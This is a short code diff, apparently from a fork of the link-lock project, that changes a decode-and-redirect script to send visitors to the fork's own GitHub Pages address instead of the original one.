@@ -96,7 +96,7 @@ const hash = window.location.hash.slice(1);
 try {
   const decoded = b64.decode(hash);
   const params = JSON.parse(decoded);
-  window.location.href = "https://jstrieb.github.io/link-lock/" + window.location.hash;
+  window.location.href = "https://jjroy017.github.io/link-lock/" + window.location.hash;
 } catch {
   window.location.replace("https://gmail.com");
 }
